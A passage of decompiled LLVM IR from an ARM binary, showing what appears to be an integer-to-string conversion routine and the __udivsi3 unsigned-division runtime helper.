  uselistorder i32 %v0_13f18, { 1, 0 }
  uselistorder i32 %v0_13f1c, { 1, 0 }
  uselistorder i32 %v1_13f08, { 0, 3, 1, 2 }
  uselistorder i32 %v1_13ef8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_13ec4, { 0, 6, 1, 2, 3, 7, 9, 4, 5, 8 }
  uselistorder i8 %v2_13ebc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @function_13f48(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13f48:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-62 = alloca i32, align 4
  %stack_var_-30 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_13f48 = load i32, i32* @r4, align 4
  store i32 %v3_13f48, i32* %stack_var_-28, align 4
  %v22_13f48 = ptrtoint i32* %stack_var_-28 to i32
  %v0_13f4c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_13f4c, i32* %r8.global-to-local, align 4
  %v2_13f4c = icmp eq i32 %v0_13f4c, 0
  store i1 %v2_13f4c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r5.global-to-local, align 4
  br i1 %v2_13f4c, label %dec_label_pc_1403c, label %dec_label_pc_13f5c

dec_label_pc_13f5c:                               ; preds = %dec_label_pc_13f48
  %v3_13f5c = icmp eq i8 %arg1, 0
  store i1 %v3_13f5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13f5c, label %.thread, label %dec_label_pc_13f70

.thread:                                          ; preds = %dec_label_pc_13f5c
  %v4_13f64 = inttoptr i32 %v0_13f4c to i8*
  store i8 48, i8* %v4_13f64, align 1
  %v0_13f68.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f68.pr.pr, label %.thread1, label %dec_label_pc_13f70

.thread1:                                         ; preds = %.thread
  %v4_13f68 = load i32, i32* %r8.global-to-local, align 4
  %v5_13f68 = add i32 %v4_13f68, 1
  %v6_13f68 = inttoptr i32 %v5_13f68 to i8*
  store i8 0, i8* %v6_13f68, align 1
  %v0_13f6c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13f6c.pr.pr, label %dec_label_pc_1403c, label %dec_label_pc_13f70

dec_label_pc_13f70:                               ; preds = %dec_label_pc_13f5c, %.thread, %.thread1
  %tmp40 = icmp slt i8 %arg1, 0
  %v7_13f74 = icmp eq i32 %arg2, 10
  store i1 %v7_13f74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13f74, label %bb, label %.thread22

.thread22:                                        ; preds = %dec_label_pc_13f70
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_13f70
  %v4_13f70 = zext i1 %tmp40 to i32
  store i32 %v4_13f70, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp40, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  br i1 %phitmp, label %.thread4, label %dec_label_pc_13f98

.thread4:                                         ; preds = %bb, %.thread22
  br label %dec_label_pc_13fa8

dec_label_pc_13f98:                               ; preds = %bb
  %v2_13f98 = sub nsw i32 0, %tmp
  store i1 %v3_13f5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13f5c, label %dec_label_pc_14048, label %dec_label_pc_13fa8

dec_label_pc_13fa8:                               ; preds = %dec_label_pc_13f98, %.thread4
  %v0_13fb010 = phi i32 [ %tmp, %.thread4 ], [ %v2_13f98, %dec_label_pc_13f98 ]
  %storemerge = phi i32 [ 0, %.thread4 ], [ 1, %dec_label_pc_13f98 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r6.global-to-local, align 4
  %v2_13fac = ptrtoint i32* %stack_var_-30 to i32
  store i32 %v2_13fac, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13fb0

dec_label_pc_13fb0:                               ; preds = %bb38, %dec_label_pc_13fa8
  %v2_13fd0 = phi i32 [ %v5_13fd0, %bb38 ], [ %v2_13fac, %dec_label_pc_13fa8 ]
  %v0_13fcc = phi i32 [ %v2_13fd4, %bb38 ], [ %v0_13fb010, %dec_label_pc_13fa8 ]
  %v0_13fb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_13fb8 = urem i32 %v0_13fcc, %v0_13fb4
  store i32 %v2_13fb8, i32* %r0.global-to-local, align 4
  %v7_13fbc = icmp eq i32 %v2_13fb8, 9
  store i1 %v7_13fbc, i1* %cpsr_z.global-to-local, align 1
  %v1_13fc0 = add i32 %v2_13fb8, 48
  store i32 %v0_13fb4, i32* %r1.global-to-local, align 4
  %v7_13fc8 = icmp sgt i32 %v2_13fb8, 9
  %extract.t = trunc i32 %v1_13fc0 to i8
  br i1 %v7_13fc8, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_13fb0
  %v9_13fc8 = add i32 %v2_13fb8, 55
  %extract.t21 = trunc i32 %v9_13fc8 to i8
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_13fb0, %bb37
  %v0_13fd0.off0 = phi i8 [ %extract.t, %dec_label_pc_13fb0 ], [ %extract.t21, %bb37 ]
  store i32 %v0_13fcc, i32* %r0.global-to-local, align 4
  %v3_13fd0 = inttoptr i32 %v2_13fd0 to i8*
  store i8 %v0_13fd0.off0, i8* %v3_13fd0, align 1
  %v4_13fd0 = load i32, i32* %r7.global-to-local, align 4
  %v5_13fd0 = add i32 %v4_13fd0, -1
  store i32 %v5_13fd0, i32* %r7.global-to-local, align 4
  %v0_13fd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_13fd4 = load i32, i32* %r1.global-to-local, align 4
  %v2_13fd4 = udiv i32 %v0_13fd4, %v1_13fd4
  store i32 %v2_13fd4, i32* %r0.global-to-local, align 4
  %v2_13fd8 = icmp ugt i32 %v1_13fd4, %v0_13fd4
  store i1 %v2_13fd8, i1* %cpsr_z.global-to-local, align 1
  %v0_13fdc = load i32, i32* %r6.global-to-local, align 4
  %v1_13fdc = add i32 %v0_13fdc, -1
  store i32 %v1_13fdc, i32* %r6.global-to-local, align 4
  br i1 %v2_13fd8, label %dec_label_pc_13fe4, label %dec_label_pc_13fb0

dec_label_pc_13fe4:                               ; preds = %bb38
  %v0_13fe4 = load i32, i32* %sl.global-to-local, align 4
  %v2_13fe4 = icmp eq i32 %v0_13fe4, 0
  store i1 %v2_13fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13fe4, label %bb39, label %dec_label_pc_1404c

bb39:                                             ; preds = %dec_label_pc_13fe4
  store i32 %v0_13fdc, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13ff0

dec_label_pc_13ff0:                               ; preds = %bb39, %dec_label_pc_1404c
  %v1_13ffc = phi i32 [ %v0_13fdc, %bb39 ], [ %v1_13ff4.pre, %dec_label_pc_1404c ]
  %v2_13ff0 = ptrtoint i32* %stack_var_-62 to i32
  %v2_13ff4 = add i32 %v1_13ffc, %v2_13ff0
  %v3_13ff4 = inttoptr i32 %v2_13ff4 to i8*
  %v4_13ff4 = load i8, i8* %v3_13ff4, align 1
  %v6_13ff4 = zext i8 %v4_13ff4 to i32
  store i32 %v6_13ff4, i32* %r2.global-to-local, align 4
  %v2_13ff8 = icmp eq i8 %v4_13ff4, 0
  store i1 %v2_13ff8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_13ff4, i32* %r1.global-to-local, align 4
  br i1 %v2_13ff8, label %dec_label_pc_14020, label %dec_label_pc_14004

dec_label_pc_14004:                               ; preds = %dec_label_pc_13ff0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14008

dec_label_pc_14008:                               ; preds = %dec_label_pc_14008, %dec_label_pc_14004
  %v0_14008 = phi i32 [ %v1_14008, %dec_label_pc_14008 ], [ 0, %dec_label_pc_14004 ]
  %v1_14008 = add i32 %v0_14008, 1
  store i32 %v1_14008, i32* %r2.global-to-local, align 4
  %v2_1400c = add i32 %v1_14008, %v2_13ff4
  %v3_1400c = inttoptr i32 %v2_1400c to i8*
  %v4_1400c = load i8, i8* %v3_1400c, align 1
  %v2_14010 = icmp eq i8 %v4_1400c, 0
  store i1 %v2_14010, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14010, label %dec_label_pc_14018, label %dec_label_pc_14008

dec_label_pc_14018:                               ; preds = %dec_label_pc_14008
  %v7_14018 = icmp eq i32 %v0_14008, -2
  store i1 %v7_14018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14018, label %dec_label_pc_1403c, label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %dec_label_pc_14018, %dec_label_pc_13ff0
  %v0_1402818 = phi i32 [ %v1_14008, %dec_label_pc_14018 ], [ %v6_13ff4, %dec_label_pc_13ff0 ]
  store i32 %v2_13ff4, i32* %r0.global-to-local, align 4
  %v0_14024 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_14024, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14028

dec_label_pc_14028:                               ; preds = %dec_label_pc_14028.dec_label_pc_14028_crit_edge, %dec_label_pc_14020
  %v2_14034 = phi i32 [ %v5_14034, %dec_label_pc_14028.dec_label_pc_14028_crit_edge ], [ %v0_14024, %dec_label_pc_14020 ]
  %v0_1402c = phi i32 [ %v0_1402c.pre, %dec_label_pc_14028.dec_label_pc_14028_crit_edge ], [ %v2_13ff4, %dec_label_pc_14020 ]
  %v0_14028 = phi i32 [ %v0_14028.pre, %dec_label_pc_14028.dec_label_pc_14028_crit_edge ], [ %v0_1402818, %dec_label_pc_14020 ]
  %v1_14028 = add i32 %v0_14028, -1
  store i32 %v1_14028, i32* %r2.global-to-local, align 4
  %v1_1402c = inttoptr i32 %v0_1402c to i8*
  %v2_1402c = load i8, i8* %v1_1402c, align 1
  %v5_1402c = add i32 %v0_1402c, 1
  store i32 %v5_1402c, i32* %r0.global-to-local, align 4
  %v3_14030 = icmp eq i32 %v0_14028, 0
  store i1 %v3_14030, i1* %cpsr_z.global-to-local, align 1
  %v3_14034 = inttoptr i32 %v2_14034 to i8*
  store i8 %v2_1402c, i8* %v3_14034, align 1
  %v4_14034 = load i32, i32* %r1.global-to-local, align 4
  %v5_14034 = add i32 %v4_14034, 1
  store i32 %v5_14034, i32* %r1.global-to-local, align 4
  br i1 %v3_14030, label %dec_label_pc_1403c, label %dec_label_pc_14028.dec_label_pc_14028_crit_edge

dec_label_pc_14028.dec_label_pc_14028_crit_edge:  ; preds = %dec_label_pc_14028
  %v0_14028.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_1402c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14028

dec_label_pc_1403c:                               ; preds = %dec_label_pc_14028, %dec_label_pc_14018, %.thread1, %dec_label_pc_13f48
  %v0_1403c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1403c, i32* %r0.global-to-local, align 4
  %v2_14044 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_14044, i32* @r4, align 4
  ret i32 %v0_1403c

dec_label_pc_14048:                               ; preds = %dec_label_pc_13f98
  store i32 32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1404c

dec_label_pc_1404c:                               ; preds = %dec_label_pc_13fe4, %dec_label_pc_14048
  %v1_14050 = phi i32 [ %v1_13fdc, %dec_label_pc_13fe4 ], [ 32, %dec_label_pc_14048 ]
  %v2_14050 = add i32 %v1_14050, %v22_13f48
  store i32 %v2_14050, i32* %r2.global-to-local, align 4
  %v3_14058 = add i32 %v2_14050, -34
  %v4_14058 = inttoptr i32 %v3_14058 to i8*
  store i8 45, i8* %v4_14058, align 1
  %v1_13ff4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13ff0

; uselistorder directives
  uselistorder i32 %v5_14034, { 1, 0 }
  uselistorder i1 %v3_14030, { 1, 0 }
  uselistorder i32 %v0_1402c, { 1, 0 }
  uselistorder i1 %v7_14018, { 1, 0 }
  uselistorder i32 %v1_14008, { 0, 1, 3, 2 }
  uselistorder i32 %v2_13ff4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_13fd4, { 1, 0 }
  uselistorder i32 %v5_13fd0, { 1, 0 }
  uselistorder i32 %v2_13fb8, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_13f5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_13f4c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 2, 7, 8, 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 9, 11, 10, 12, 13 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder i32 48, { 4, 2, 1, 0, 3 }
  uselistorder i32 9, { 4, 50, 5, 21, 6, 44, 18, 10, 23, 11, 22, 9, 3, 45, 19, 2, 20, 46, 12, 48, 49, 24, 25, 13, 26, 27, 28, 0, 14, 15, 16, 1, 17, 29, 47, 30, 31, 7, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 52, 8, 53 }
  uselistorder i32 32, { 47, 60, 61, 56, 49, 48, 4, 3, 6, 5, 8, 7, 10, 9, 55, 12, 11, 13, 14, 15, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 50, 57, 58, 27, 59, 28, 29, 30, 0, 31, 1, 2, 32, 33, 34, 35, 36, 38, 37, 51, 62, 52, 63, 53, 64, 40, 39, 42, 41, 43, 44, 45, 46, 54 }
  uselistorder i32 10, { 74, 0, 1, 9, 35, 5, 30, 37, 10, 36, 4, 64, 65, 31, 11, 66, 32, 67, 12, 68, 13, 69, 14, 70, 15, 71, 72, 38, 16, 17, 18, 19, 20, 21, 22, 39, 23, 40, 6, 41, 42, 2, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 24, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 7, 75, 73, 76, 3, 28, 33, 77, 26, 78, 29, 34, 8, 79, 25, 80, 27 }
  uselistorder i8 0, { 27, 28, 0, 10, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 41, 42, 43, 44, 45, 1, 12, 11, 13, 48, 50, 47, 22, 49, 23, 51, 52, 46, 2, 53, 54, 55, 4, 5, 3, 56, 57, 58, 15, 14, 59, 60, 63, 25, 61, 62, 24, 64, 65, 66, 67, 68, 16, 7, 17, 69, 18, 19, 70, 71, 72, 74, 75, 9, 78, 21, 84, 79, 80, 76, 77, 20, 26, 81, 82, 83, 8, 85, 86, 73, 87, 88, 89, 90, 91, 92, 93 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1404c, { 1, 0 }
  uselistorder label %dec_label_pc_13ff0, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_13f70, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_14060 = add i32 %arg2, -1
  %v7_14060 = icmp eq i32 %arg2, 1
  br i1 %v7_14060, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_14064 = load i32, i32* @r0, align 4
  ret i32 %v2_14064

bb80:                                             ; preds = %entry
  %v2_14060 = icmp eq i32 %arg2, 0
  br i1 %v2_14060, label %dec_label_pc_14148, label %dec_label_pc_1406c

dec_label_pc_1406c:                               ; preds = %bb80
  %v0_1406c = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_1406c, %arg2
  br i1 %tmp, label %dec_label_pc_14074, label %dec_label_pc_14100

dec_label_pc_14074:                               ; preds = %dec_label_pc_1406c
  %v2_14074 = and i32 %v1_14060, %arg2
  %v4_14074 = icmp eq i32 %v2_14074, 0
  br i1 %v4_14074, label %dec_label_pc_1410c, label %dec_label_pc_1407c

dec_label_pc_1407c:                               ; preds = %dec_label_pc_14074
  %v3_1407c = icmp ult i32 %arg2, 536870912
  br i1 %v3_1407c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_1407c
  %v4_14080 = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_1407c, %.thread
  %v0_140a0.pr36.ph = phi i32 [ %v4_14080, %.thread ], [ %arg2, %dec_label_pc_1407c ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_1407c ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_140a0.pr36 = phi i32 [ %v4_14094, %bb83 ], [ %v0_140a0.pr36.ph, %.preheader.preheader ]
  %v1_14098 = phi i32 [ %v4_14098, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_1408c = icmp ugt i32 %v0_140a0.pr36, 268435455
  br i1 %v2_1408c, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_140a0thread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_14090 = icmp ult i32 %v0_140a0.pr36, %v0_1406c
  br i1 %v4_14090, label %bb82, label %dec_label_pc_140a0thread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_14094 = and i32 %v0_140a0.pr36, 268435456
  %v3_14094 = icmp eq i32 %v2_14094, 0
  %v4_14094 = mul i32 %v0_140a0.pr36, 16
  br i1 %v3_14094, label %bb83, label %dec_label_pc_140a0.loopexit

bb83:                                             ; preds = %bb82
  %v2_14098 = and i32 %v1_14098, 268435456
  %v3_14098 = icmp eq i32 %v2_14098, 0
  %v4_14098 = mul i32 %v1_14098, 16
  br i1 %v3_14098, label %.preheader, label %dec_label_pc_140a0thread-pre-split.loopexit.loopexit

dec_label_pc_140a0thread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_140ac48.ph = phi i32 [ %v1_14098, %bb81 ], [ %v4_14098, %bb83 ]
  %v0_140a0.pr38.ph = phi i32 [ %v0_140a0.pr36, %bb81 ], [ %v4_14094, %bb83 ]
  br label %dec_label_pc_140a0thread-pre-split.loopexit

dec_label_pc_140a0thread-pre-split.loopexit:      ; preds = %dec_label_pc_140a0thread-pre-split.loopexit.loopexit, %.thread2
  %v1_140ac48 = phi i32 [ %v1_14098, %.thread2 ], [ %v1_140ac48.ph, %dec_label_pc_140a0thread-pre-split.loopexit.loopexit ]
  %v0_140a0.pr38 = phi i32 [ %v0_140a0.pr36, %.thread2 ], [ %v0_140a0.pr38.ph, %dec_label_pc_140a0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_140a0thread-pre-split

dec_label_pc_140a0thread-pre-split:               ; preds = %dec_label_pc_140a0thread-pre-split.loopexit, %bb85
  %v1_140ac46 = phi i32 [ %v1_140ac48, %dec_label_pc_140a0thread-pre-split.loopexit ], [ %v3_140ac, %bb85 ]
  %v0_140a0.pr = phi i32 [ %v0_140a0.pr38, %dec_label_pc_140a0thread-pre-split.loopexit ], [ %v3_140a8, %bb85 ]
  br label %dec_label_pc_140a0

dec_label_pc_140a0.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %dec_label_pc_140a0.loopexit, %dec_label_pc_140a0thread-pre-split
  %v1_140ac = phi i32 [ %v1_140ac46, %dec_label_pc_140a0thread-pre-split ], [ %v1_14098, %dec_label_pc_140a0.loopexit ]
  %v1_140a8 = phi i32 [ %v0_140a0.pr, %dec_label_pc_140a0thread-pre-split ], [ %v4_14094, %dec_label_pc_140a0.loopexit ]
  %v2_140a0 = icmp slt i32 %v1_140a8, 0
  br i1 %v2_140a0, label %dec_label_pc_140b4, label %bb84

bb84:                                             ; preds = %dec_label_pc_140a0
  %v4_140a4 = icmp ult i32 %v1_140a8, %v0_1406c
  br i1 %v4_140a4, label %bb85, label %dec_label_pc_140b4

bb85:                                             ; preds = %bb84
  %v3_140a8 = mul i32 %v1_140a8, 2
  %v2_140ac = icmp slt i32 %v1_140ac, 0
  %v3_140ac = mul i32 %v1_140ac, 2
  br i1 %v2_140ac, label %dec_label_pc_140b4, label %dec_label_pc_140a0thread-pre-split

dec_label_pc_140b4:                               ; preds = %bb84, %dec_label_pc_140a0, %bb85
  %v2_140c059 = phi i32 [ %v3_140ac, %bb85 ], [ %v1_140ac, %bb84 ], [ %v1_140ac, %dec_label_pc_140a0 ]
  %v1_140b851 = phi i32 [ %v3_140a8, %bb85 ], [ %v1_140a8, %bb84 ], [ %v1_140a8, %dec_label_pc_140a0 ]
  br label %dec_label_pc_140b8

dec_label_pc_140b8:                               ; preds = %.thread11, %dec_label_pc_140b4
  %v1_140ec = phi i32 [ %v4_140ec, %.thread11 ], [ %v2_140c059, %dec_label_pc_140b4 ]
  %v1_140c0 = phi i32 [ %v0_140f8, %.thread11 ], [ 0, %dec_label_pc_140b4 ]
  %v1_140f0 = phi i32 [ %v4_140f0, %.thread11 ], [ %v1_140b851, %dec_label_pc_140b4 ]
  %v1_140bc = phi i32 [ %v0_140e8, %.thread11 ], [ %v0_1406c, %dec_label_pc_140b4 ]
  %v3_140b8 = icmp ult i32 %v1_140bc, %v1_140f0
  br i1 %v3_140b8, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_140b8
  %v3_140bc = sub i32 %v1_140bc, %v1_140f0
  %v3_140c0 = or i32 %v1_140c0, %v1_140ec
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_140b8, %bb86
  %v1_140c8 = phi i32 [ %v1_140bc, %dec_label_pc_140b8 ], [ %v3_140bc, %bb86 ]
  %v1_140cc = phi i32 [ %v1_140c0, %dec_label_pc_140b8 ], [ %v3_140c0, %bb86 ]
  %v4_140c4 = udiv i32 %v1_140f0, 2
  %v6_140c4 = icmp ult i32 %v1_140c8, %v4_140c4
  br i1 %v6_140c4, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_140c8 = urem i32 %v1_140f0, 2
  %v4_140c8 = icmp eq i32 %v3_140c8, 0
  %v6_140c8 = sub i32 %v1_140c8, %v4_140c4
  br i1 %v4_140c8, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_140cc = udiv i32 %v1_140ec, 2
  %v6_140cc = or i32 %v1_140cc, %v5_140cc
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_140d4 = phi i32 [ %v6_140c8, %bb87 ], [ %v1_140c8, %.thread7 ], [ %v6_140c8, %bb88 ]
  %v1_140d8 = phi i32 [ %v1_140cc, %bb87 ], [ %v1_140cc, %.thread7 ], [ %v6_140cc, %bb88 ]
  %v4_140d0 = udiv i32 %v1_140f0, 4
  %v6_140d0 = icmp ult i32 %v1_140d4, %v4_140d0
  br i1 %v6_140d0, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_140d4 = and i32 %v1_140f0, 2
  %v4_140d4 = icmp eq i32 %v3_140d4, 0
  %v6_140d4 = sub i32 %v1_140d4, %v4_140d0
  br i1 %v4_140d4, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_140d8 = udiv i32 %v1_140ec, 4
  %v6_140d8 = or i32 %v1_140d8, %v5_140d8
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_140e0 = phi i32 [ %v6_140d4, %bb89 ], [ %v1_140d4, %.thread8 ], [ %v6_140d4, %bb90 ]
  %v1_140e4 = phi i32 [ %v1_140d8, %bb89 ], [ %v1_140d8, %.thread8 ], [ %v6_140d8, %bb90 ]
  %v4_140dc = udiv i32 %v1_140f0, 8
  %v6_140dc = icmp ult i32 %v1_140e0, %v4_140dc
  br i1 %v6_140dc, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_140e0 = and i32 %v1_140f0, 4
  %v4_140e0 = icmp eq i32 %v3_140e0, 0
  %v6_140e0 = sub i32 %v1_140e0, %v4_140dc
  br i1 %v4_140e0, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_140e4 = udiv i32 %v1_140ec, 8
  %v6_140e4 = or i32 %v1_140e4, %v5_140e4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_140f8 = phi i32 [ %v1_140e4, %bb91 ], [ %v1_140e4, %.thread9 ], [ %v6_140e4, %bb92 ]
  %v0_140e8 = phi i32 [ %v6_140e0, %bb91 ], [ %v1_140e0, %.thread9 ], [ %v6_140e0, %bb92 ]
  %v2_140e8 = icmp eq i32 %v0_140e8, 0
  br i1 %v2_140e8, label %dec_label_pc_140f8, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_140ec, 16
  br i1 %tmp140, label %dec_label_pc_140f8, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_140ec = udiv i32 %v1_140ec, 16
  %v4_140f0 = udiv i32 %v1_140f0, 16
  br label %dec_label_pc_140b8

dec_label_pc_140f8:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_140f8

dec_label_pc_14100:                               ; preds = %dec_label_pc_1406c
  %v9_1406c = icmp eq i32 %v0_1406c, %arg2
  %. = zext i1 %v9_1406c to i32
  ret i32 %.

dec_label_pc_1410c:                               ; preds = %dec_label_pc_14074
  %v2_1410c = icmp ugt i32 %arg2, 65535
  br i1 %v2_1410c, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_1410c
  %v2_14110 = and i32 %arg2, 32768
  %v3_14110 = icmp eq i32 %v2_14110, 0
  %v4_14110 = udiv i32 %arg2, 65536
  br i1 %v3_14110, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_1410c
  %v0_1411c65 = phi i32 [ %arg2, %dec_label_pc_1410c ], [ %v4_14110, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_14120 = phi i32 [ %v0_1411c65, %.thread16 ], [ %v4_14110, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_1411c = icmp ugt i32 %v1_14120, 255
  br i1 %v2_1411c, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_14120 = and i32 %v1_14120, 128
  %v3_14120 = icmp eq i32 %v2_14120, 0
  %v4_14120 = udiv i32 %v1_14120, 256
  br i1 %v3_14120, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_14124 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_14130 = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_14124, %bb100 ]
  %v1_1412c = phi i32 [ %v1_14120, %bb98 ], [ %v4_14120, %bb99 ], [ %v4_14120, %bb100 ]
  %v2_14128 = icmp ugt i32 %v1_1412c, 15
  br i1 %v2_14128, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_1412c = and i32 %v1_1412c, 8
  %v3_1412c = icmp eq i32 %v2_1412c, 0
  %v4_1412c = udiv i32 %v1_1412c, 16
  br i1 %v3_1412c, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_14130 = add nsw i32 %v1_14130, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_14138 = phi i32 [ %v1_14130, %.thread17 ], [ %v1_14130, %bb101 ], [ %v2_14130, %bb102 ]
  %v5_1413c = phi i32 [ %v1_1412c, %.thread17 ], [ %v4_1412c, %bb101 ], [ %v4_1412c, %bb102 ]
  %v2_14134 = icmp ugt i32 %v5_1413c, 3
  %v7_14134 = icmp eq i32 %v5_1413c, 4
  %v2_14138 = xor i1 %v7_14134, true
  %v3_14138 = and i1 %v2_14134, %v2_14138
  br i1 %v3_14138, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_14138 = add nsw i32 %v4_14138, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_1413c = phi i32 [ %v4_14138, %.thread18 ], [ %v5_14138, %bb103 ]
  %v2_1413c = xor i1 %v2_14134, true
  %v3_1413c = or i1 %v7_14134, %v2_1413c
  br i1 %v3_1413c, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_1413c = udiv i32 %v5_1413c, 2
  %v9_1413c = add i32 %v4_1413c, %v8_1413c
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_14140 = phi i32 [ %v4_1413c, %bb104 ], [ %v9_1413c, %bb105 ]
  %v6_14140 = lshr i32 %v0_1406c, %v1_14140
  ret i32 %v6_14140

